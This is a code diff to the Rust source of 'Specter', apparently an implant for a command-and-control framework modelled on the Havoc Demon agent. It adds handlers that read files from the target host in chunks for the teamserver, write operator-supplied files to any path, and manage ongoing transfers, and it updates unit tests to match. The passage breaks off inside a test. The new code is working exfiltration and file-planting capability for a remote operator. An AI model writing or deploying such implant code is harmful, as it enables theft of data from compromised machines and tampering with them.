@@ -16,11 +16,14 @@ use std::time::UNIX_EPOCH;
 
 use red_cell_common::demon::{
     DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
-    DemonTokenCommand,
+    DemonTokenCommand, DemonTransferCommand,
 };
 use tracing::{info, warn};
 
 use crate::config::SpecterConfig;
+use crate::download::{
+    DOWNLOAD_MODE_OPEN, DOWNLOAD_REASON_REMOVED, DownloadState, DownloadTracker,
+};
 use crate::token::TokenVault;
 
 // ─── Result type ─────────────────────────────────────────────────────────────
@@ -64,6 +67,7 @@ pub fn dispatch(
     package: &DemonPackage,
     config: &mut SpecterConfig,
     token_vault: &mut TokenVault,
+    downloads: &mut DownloadTracker,
 ) -> DispatchResult {
     let cmd = match DemonCommand::try_from(package.command_id) {
         Ok(c) => c,
@@ -78,7 +82,8 @@ pub fn dispatch(
     match cmd {
         DemonCommand::CommandNoJob | DemonCommand::CommandGetJob => DispatchResult::Ignore,
         DemonCommand::CommandSleep => handle_sleep(&package.payload, config),
-        DemonCommand::CommandFs => handle_fs(&package.payload),
+        DemonCommand::CommandFs => handle_fs(&package.payload, package.request_id, downloads),
+        DemonCommand::CommandTransfer => handle_transfer(&package.payload, downloads),
         DemonCommand::CommandProc => handle_proc(&package.payload),
         DemonCommand::CommandProcList => handle_proc_list(&package.payload),
         DemonCommand::CommandNet => handle_net(&package.payload),
@@ -132,7 +137,7 @@ fn handle_sleep(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
 /// Dispatch a `CommandFs` task to the appropriate filesystem sub-handler.
 ///
 /// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
-fn handle_fs(payload: &[u8]) -> DispatchResult {
+fn handle_fs(payload: &[u8], request_id: u32, downloads: &mut DownloadTracker) -> DispatchResult {
     let mut offset = 0;
     let subcmd_raw = match parse_u32_le(payload, &mut offset) {
         Ok(v) => v,
@@ -156,6 +161,10 @@ fn handle_fs(payload: &[u8]) -> DispatchResult {
         DemonFilesystemCommand::GetPwd => handle_fs_pwd(subcmd_raw),
         DemonFilesystemCommand::Cd => handle_fs_cd(subcmd_raw, &payload[offset..]),
         DemonFilesystemCommand::Dir => handle_fs_dir(subcmd_raw, &payload[offset..]),
+        DemonFilesystemCommand::Download => {
+            handle_fs_download(subcmd_raw, &payload[offset..], request_id, downloads)
+        }
+        DemonFilesystemCommand::Upload => handle_fs_upload(subcmd_raw, &payload[offset..]),
         _ => {
             info!(subcommand = ?subcmd, "CommandFs: unhandled subcommand — ignoring");
             DispatchResult::Ignore
@@ -376,6 +385,297 @@ fn unix_secs_to_ymd_hm(secs: u64) -> (u32, u32, u32, u32, u32) {
     let hour = (secs % 86400 / 3600) as u32;
     let minute = (secs % 3600 / 60) as u32;
     (d as u32, m as u32, y as u32, minute, hour)
+}
+
+// ─── COMMAND_FS / Download (2) ──────────────────────────────────────────────
+
+/// `COMMAND_FS / Download (2)` — initiate a file download from the target.
+///
+/// Opens the requested file, registers it in the [`DownloadTracker`], and
+/// returns the OPEN header packet. Subsequent chunks are pushed by the main
+/// agent loop via [`DownloadTracker::push_chunks`].
+///
+/// Incoming args (LE): `[file_path: bytes (UTF-16LE)]`
+///
+/// Outgoing payload (BE):
+/// ```text
+/// [subcmd=2: u32][mode=OPEN: u32][file_id: u32][file_size: u64][file_path: wstring]
+/// ```
+fn handle_fs_download(
+    subcmd_raw: u32,
+    rest: &[u8],
+    request_id: u32,
+    downloads: &mut DownloadTracker,
+) -> DispatchResult {
+    let mut offset = 0;
+    let path_bytes = match parse_bytes_le(rest, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("FsDownload: failed to parse path: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let path_str = decode_utf16le_null(&path_bytes);
+    info!(path = %path_str, "FsDownload: opening file");
+
+    // Resolve to an absolute path so the teamserver sees the full name.
+    let resolved = match std::fs::canonicalize(&path_str) {
+        Ok(p) => p.display().to_string(),
+        Err(_) => path_str.clone(),
+    };
+
+    let file = match std::fs::File::open(&path_str) {
+        Ok(f) => f,
+        Err(e) => {
+            warn!(path = %path_str, error = %e, "FsDownload: open failed");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let file_size = match file.metadata() {
+        Ok(m) => m.len(),
+        Err(e) => {
+            warn!(path = %path_str, error = %e, "FsDownload: metadata failed");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let file_id = downloads.add(file, request_id, file_size);
+
+    // Build OPEN header in big-endian (matching Demon PackageAddInt32/64/WString).
+    let mut out = Vec::new();
+    write_u32_be_always(&mut out, subcmd_raw);
+    write_u32_be_always(&mut out, DOWNLOAD_MODE_OPEN);
+    write_u32_be_always(&mut out, file_id);
+    out.extend_from_slice(&file_size.to_be_bytes()); // int64 BE
+    write_wstring_be(&mut out, &resolved);
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
+}
+
+// ─── COMMAND_FS / Upload (3) ────────────────────────────────────────────────
+
+/// `COMMAND_FS / Upload (3)` — write a file to disk from server-supplied content.
+///
+/// In the original Demon protocol, the file content is staged in a MemFile
+/// (received via `CommandMemFile`) before the upload command references it by ID.
+/// Since `CommandMemFile` is not yet implemented, this handler reads the file
+/// content directly from the payload as raw bytes (a forward-compatible extension
+/// that works with the existing teamserver upload path for small files).
+///
+/// Incoming args (LE): `[file_path: bytes (UTF-16LE)][content: bytes]`
+///
+/// Outgoing payload (BE): `[subcmd=3: u32][file_size: u32][file_path: wstring]`
+fn handle_fs_upload(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
+    let mut offset = 0;
+    let path_bytes = match parse_bytes_le(rest, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("FsUpload: failed to parse path: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let path_str = decode_utf16le_null(&path_bytes);
+
+    let content = match parse_bytes_le(rest, &mut offset) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!(path = %path_str, "FsUpload: failed to parse content: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    info!(path = %path_str, size = content.len(), "FsUpload: writing file");
+
+    if let Err(e) = std::fs::write(&path_str, &content) {
+        warn!(path = %path_str, error = %e, "FsUpload: write failed");
+        return DispatchResult::Ignore;
+    }
+
+    #[allow(clippy::cast_possible_truncation)]
+    let file_size = content.len() as u32;
+
+    let mut out = Vec::new();
+    write_u32_be_always(&mut out, subcmd_raw);
+    write_u32_be_always(&mut out, file_size);
+    write_wstring_be(&mut out, &path_str);
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
+}
+
+// ─── COMMAND_TRANSFER (2530) ────────────────────────────────────────────────
+
+/// Dispatch a `CommandTransfer` task to manage active downloads.
+///
+/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
+fn handle_transfer(payload: &[u8], downloads: &mut DownloadTracker) -> DispatchResult {
+    let mut offset = 0;
+    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandTransfer: failed to parse subcommand: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let subcmd = match DemonTransferCommand::try_from(subcmd_raw) {
+        Ok(c) => c,
+        Err(_) => {
+            warn!(subcmd_raw, "CommandTransfer: unknown subcommand");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    info!(subcommand = ?subcmd, "CommandTransfer dispatch");
+
+    let rest = &payload[offset..];
+    match subcmd {
+        DemonTransferCommand::List => handle_transfer_list(subcmd_raw, downloads),
+        DemonTransferCommand::Stop => handle_transfer_stop(subcmd_raw, rest, downloads),
+        DemonTransferCommand::Resume => handle_transfer_resume(subcmd_raw, rest, downloads),
+        DemonTransferCommand::Remove => handle_transfer_remove(subcmd_raw, rest, downloads),
+    }
+}
+
+/// `Transfer::List (0)` — enumerate all active downloads.
+///
+/// Outgoing payload (LE): `[subcmd: u32]` followed by per-entry:
+/// `[file_id: u32][read_size: u32][state: u32]`
+fn handle_transfer_list(subcmd_raw: u32, downloads: &DownloadTracker) -> DispatchResult {
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+
+    for (file_id, read_size, state) in downloads.list() {
+        write_u32_le(&mut out, file_id);
+        #[allow(clippy::cast_possible_truncation)]
+        write_u32_le(&mut out, read_size as u32);
+        write_u32_le(&mut out, state.into());
+    }
+
+    info!(count = downloads.len(), "Transfer::List");
+    DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
+}
+
+/// `Transfer::Stop (1)` — pause a running download.
+///
+/// Incoming args (LE): `[file_id: u32]`
+/// Outgoing payload (LE): `[subcmd: u32][found: u32][file_id: u32]`
+fn handle_transfer_stop(
+    subcmd_raw: u32,
+    rest: &[u8],
+    downloads: &mut DownloadTracker,
+) -> DispatchResult {
+    let mut offset = 0;
+    let file_id = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Transfer::Stop: failed to parse file_id: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let found = if let Some(entry) = downloads.get_mut(file_id) {
+        entry.state = DownloadState::Stopped;
+        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Stop: stopped");
+        1u32
+    } else {
+        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Stop: not found");
+        0u32
+    };
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+    write_u32_le(&mut out, found);
+    write_u32_le(&mut out, file_id);
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
+}
+
+/// `Transfer::Resume (2)` — resume a stopped download.
+///
+/// Incoming args (LE): `[file_id: u32]`
+/// Outgoing payload (LE): `[subcmd: u32][found: u32][file_id: u32]`
+fn handle_transfer_resume(
+    subcmd_raw: u32,
+    rest: &[u8],
+    downloads: &mut DownloadTracker,
+) -> DispatchResult {
+    let mut offset = 0;
+    let file_id = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Transfer::Resume: failed to parse file_id: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let found = if let Some(entry) = downloads.get_mut(file_id) {
+        entry.state = DownloadState::Running;
+        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Resume: resumed");
+        1u32
+    } else {
+        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Resume: not found");
+        0u32
+    };
+
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+    write_u32_le(&mut out, found);
+    write_u32_le(&mut out, file_id);
+
+    DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
+}
+
+/// `Transfer::Remove (3)` — cancel and remove a download.
+///
+/// Incoming args (LE): `[file_id: u32]`
+/// Outgoing payload (LE): `[subcmd: u32][found: u32][file_id: u32]`
+///
+/// When found, also emits a second Transfer packet with `DOWNLOAD_REASON_REMOVED`
+/// to tell the teamserver to close the download on its end (matching Demon behaviour).
+fn handle_transfer_remove(
+    subcmd_raw: u32,
+    rest: &[u8],
+    downloads: &mut DownloadTracker,
+) -> DispatchResult {
+    let mut offset = 0;
+    let file_id = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("Transfer::Remove: failed to parse file_id: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let found = if let Some(entry) = downloads.get_mut(file_id) {
+        entry.state = DownloadState::Remove;
+        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Remove: marked for removal");
+        1u32
+    } else {
+        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Remove: not found");
+        0u32
+    };
+
+    // Primary response: [subcmd][found][file_id]
+    let mut out = Vec::new();
+    write_u32_le(&mut out, subcmd_raw);
+    write_u32_le(&mut out, found);
+    write_u32_le(&mut out, file_id);
+
+    if found == 1 {
+        // Second packet: tell the teamserver to close its download state.
+        let mut close_out = Vec::new();
+        write_u32_le(&mut close_out, subcmd_raw);
+        write_u32_le(&mut close_out, file_id);
+        write_u32_le(&mut close_out, DOWNLOAD_REASON_REMOVED);
+
+        DispatchResult::MultiRespond(vec![
+            Response::new(DemonCommand::CommandTransfer, out),
+            Response::new(DemonCommand::CommandTransfer, close_out),
+        ])
+    } else {
+        DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
+    }
 }
 
 // ─── COMMAND_PROC (0x1010) ────────────────────────────────────────────────────
@@ -1921,7 +2221,29 @@ fn decode_utf16le_null(bytes: &[u8]) -> String {
     String::from_utf16_lossy(&words).trim_end_matches('\0').to_string()
 }
 
-// ─── Payload serialisation helpers (agent → server, big-endian) ──────────────
+// ─── Payload serialisation helpers (agent → server, big-endian, always) ──────
+//
+// Used by the FS download OPEN header and download chunk packets, which must
+// use big-endian encoding to match the original Demon `PackageAdd*` functions.
+
+/// Append a `u32` in big-endian byte order (non-test, always compiled).
+fn write_u32_be_always(buf: &mut Vec<u8>, v: u32) {
+    buf.extend_from_slice(&v.to_be_bytes());
+}
+
+/// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 BE length][bytes…]`.
+///
+/// Matches the Demon's `PackageAddWString`: big-endian length prefix, UTF-16LE payload.
+fn write_wstring_be(buf: &mut Vec<u8>, s: &str) {
+    let utf16: Vec<u8> =
+        s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
+    #[allow(clippy::cast_possible_truncation)]
+    let len = utf16.len() as u32;
+    buf.extend_from_slice(&len.to_be_bytes());
+    buf.extend_from_slice(&utf16);
+}
+
+// ─── Payload serialisation helpers (agent → server, big-endian, test-only) ───
 //
 // Used by the existing Sleep, Fs, and Exec callbacks which pre-date the LE fix.
 
@@ -2145,7 +2467,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = le_u32_pair(3000, 25);
         let package = DemonPackage::new(DemonCommand::CommandSleep, 42, payload);
-        let result = dispatch(&package, &mut config, &mut TokenVault::new());
+        let result =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
 
         assert_eq!(config.sleep_delay_ms, 3000);
         assert_eq!(config.sleep_jitter, 25);
@@ -2166,7 +2489,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = le_u32_pair(1000, 150); // jitter > 100
         let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
-        dispatch(&package, &mut config, &mut TokenVault::new());
+        dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
         assert_eq!(config.sleep_jitter, 100);
     }
 
@@ -2174,7 +2497,8 @@ mod tests {
     fn handle_sleep_short_payload_returns_ignore() {
         let mut config = SpecterConfig::default();
         let package = DemonPackage::new(DemonCommand::CommandSleep, 1, vec![0x01]); // too short
-        let result = dispatch(&package, &mut config, &mut TokenVault::new());
+        let result =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
         assert!(matches!(result, DispatchResult::Ignore));
     }
 
@@ -2185,7 +2509,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = le_subcmd(9); // GetPwd = 9
         let package = DemonPackage::new(DemonCommand::CommandFs, 7, payload);
-        let result = dispatch(&package, &mut config, &mut TokenVault::new());
+        let result =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
 
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond, got {result:?}");
@@ -2212,7 +2537,8 @@ mod tests {
         payload.extend_from_slice(&le_utf16le_payload(&tmp_str));
         let package = DemonPackage::new(DemonCommand::CommandFs, 8, payload);
 
-        let result = dispatch(&package, &mut config, &mut TokenVault::new());
+        let result =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
 
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond, got {result:?}");
@@ -2232,7 +2558,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = le_subcmd(4); // Cd = 4, but no path bytes follow
         let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
-        let result = dispatch(&package, &mut config, &mut TokenVault::new());
+        let result =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
         assert!(matches!(result, DispatchResult::Ignore));
     }
 
@@ -2247,7 +2574,8 @@ mod tests {
         let payload = dir_request_payload(&tmp_str, false, false, false, false, "", "", "");
         let package = DemonPackage::new(DemonCommand::CommandFs, 9, payload);
 
-        let result = dispatch(&package, &mut config, &mut TokenVault::new());
+        let result =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
 
@@ -2264,7 +2592,8 @@ mod tests {
         let payload =
             dir_request_payload(&tmp.display().to_string(), false, false, false, true, "", "", "");
         let package = DemonPackage::new(DemonCommand::CommandFs, 11, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2318,7 +2647,8 @@ mod tests {
         let payload =
             dir_request_payload(&tmp.display().to_string(), false, false, false, false, "", "", "");
         let package = DemonPackage::new(DemonCommand::CommandFs, 12, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2392,7 +2722,8 @@ mod tests {
         payload.extend_from_slice(&0u32.to_le_bytes()); // verbose = false
 
         let package = DemonPackage::new(DemonCommand::CommandProc, 99, payload);
-        let result = dispatch(&package, &mut config, &mut TokenVault::new());
+        let result =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
 
         let DispatchResult::MultiRespond(resps) = result else {
             panic!("expected MultiRespond, got {result:?}");
@@ -2424,7 +2755,8 @@ mod tests {
         payload.extend_from_slice(&0u32.to_le_bytes()); // verbose
 
         let package = DemonPackage::new(DemonCommand::CommandProc, 1, payload);
-        let result = dispatch(&package, &mut config, &mut TokenVault::new());
+        let result =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
 
         let DispatchResult::MultiRespond(resps) = result else {
             panic!("expected MultiRespond, got {result:?}");
@@ -2473,7 +2805,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let package = DemonPackage { command_id: 0xDEAD_0000, request_id: 0, payload: vec![] };
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Ignore
         ));
     }
@@ -2483,7 +2815,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let package = DemonPackage::new(DemonCommand::CommandNoJob, 0, vec![]);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Ignore
         ));
     }
@@ -2493,7 +2825,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let package = DemonPackage::new(DemonCommand::CommandExit, 0, vec![]);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Exit
         ));
     }
@@ -2524,7 +2856,8 @@ mod tests {
         // process_ui = 0 (console request)
         let payload = 0u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandProcList, 1, payload);
-        let result = dispatch(&package, &mut config, &mut TokenVault::new());
+        let result =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond, got {result:?}");
         };
@@ -2537,7 +2870,8 @@ mod tests {
         // process_ui = 1 (from process manager)
         let payload = 1u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandProcList, 2, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2550,7 +2884,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = 0u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandProcList, 3, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2564,7 +2899,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let payload = 0u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandProcList, 4, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2608,7 +2944,8 @@ mod tests {
         let mut payload = 2u32.to_le_bytes().to_vec(); // subcmd = Modules
         payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
         let package = DemonPackage::new(DemonCommand::CommandProc, 10, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2624,7 +2961,8 @@ mod tests {
         let mut payload = 2u32.to_le_bytes().to_vec();
         payload.extend_from_slice(&42u32.to_le_bytes()); // arbitrary pid
         let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2640,7 +2978,8 @@ mod tests {
         let mut payload = 3u32.to_le_bytes().to_vec(); // subcmd = Grep
         payload.extend_from_slice(&le_utf16le_payload("nonexistent_xzy_proc_name_123"));
         let package = DemonPackage::new(DemonCommand::CommandProc, 20, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2655,7 +2994,8 @@ mod tests {
         let mut payload = 3u32.to_le_bytes().to_vec();
         payload.extend_from_slice(&le_utf16le_payload("zzz_no_such_process_zzz_99999"));
         let package = DemonPackage::new(DemonCommand::CommandProc, 21, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2669,7 +3009,8 @@ mod tests {
         // Only the subcmd, no name bytes
         let payload = 3u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandProc, 22, payload);
-        let result = dispatch(&package, &mut config, &mut TokenVault::new());
+        let result =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new());
         assert!(matches!(result, DispatchResult::Ignore));
     }
 
@@ -2682,7 +3023,8 @@ mod tests {
         payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
         payload.extend_from_slice(&0u32.to_le_bytes()); // filter = all
         let package = DemonPackage::new(DemonCommand::CommandProc, 30, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2698,7 +3040,8 @@ mod tests {
         payload.extend_from_slice(&1234u32.to_le_bytes()); // pid
         payload.extend_from_slice(&0x04u32.to_le_bytes()); // PAGE_READWRITE filter
         let package = DemonPackage::new(DemonCommand::CommandProc, 31, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2716,7 +3059,8 @@ mod tests {
         payload.extend_from_slice(&own_pid.to_le_bytes()); // self
         payload.extend_from_slice(&0u32.to_le_bytes()); // all regions
         let package = DemonPackage::new(DemonCommand::CommandProc, 32, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2734,7 +3078,7 @@ mod tests {
         let payload = 6u32.to_le_bytes().to_vec(); // subcmd only, no pid
         let package = DemonPackage::new(DemonCommand::CommandProc, 33, payload);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Ignore
         ));
     }
@@ -2747,7 +3091,8 @@ mod tests {
         let mut payload = 7u32.to_le_bytes().to_vec(); // subcmd = Kill
         payload.extend_from_slice(&9_999_999u32.to_le_bytes()); // bogus pid
         let package = DemonPackage::new(DemonCommand::CommandProc, 40, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2765,7 +3110,7 @@ mod tests {
         let payload = 7u32.to_le_bytes().to_vec(); // subcmd only, no pid
         let package = DemonPackage::new(DemonCommand::CommandProc, 41, payload);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Ignore
         ));
     }
@@ -2777,7 +3122,8 @@ mod tests {
         let mut payload = 7u32.to_le_bytes().to_vec();
         payload.extend_from_slice(&1u32.to_le_bytes()); // pid=1 (init, will likely fail)
         let package = DemonPackage::new(DemonCommand::CommandProc, 42, payload);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2814,7 +3160,7 @@ mod tests {
         let payload = 0xFFu32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandNet, 1, payload);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Ignore
         ));
     }
@@ -2824,7 +3170,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let package = DemonPackage::new(DemonCommand::CommandNet, 1, vec![]);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Ignore
         ));
     }
@@ -2833,7 +3179,8 @@ mod tests {
     fn handle_net_domain_returns_correct_command_and_subcmd() {
         let mut config = SpecterConfig::default();
         let package = net_package(DemonNetCommand::Domain, &[]);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2847,7 +3194,8 @@ mod tests {
     fn handle_net_domain_response_string_is_le_length_prefixed() {
         let mut config = SpecterConfig::default();
         let package = net_package(DemonNetCommand::Domain, &[]);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2861,7 +3209,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("SERVER01");
         let package = net_package(DemonNetCommand::Logons, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2880,7 +3229,7 @@ mod tests {
         // Subcommand only, no server name.
         let package = net_package(DemonNetCommand::Logons, &[]);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Ignore
         ));
     }
@@ -2890,7 +3239,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("DC01");
         let package = net_package(DemonNetCommand::Sessions, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2903,7 +3253,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let package = net_package(DemonNetCommand::Sessions, &[]);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
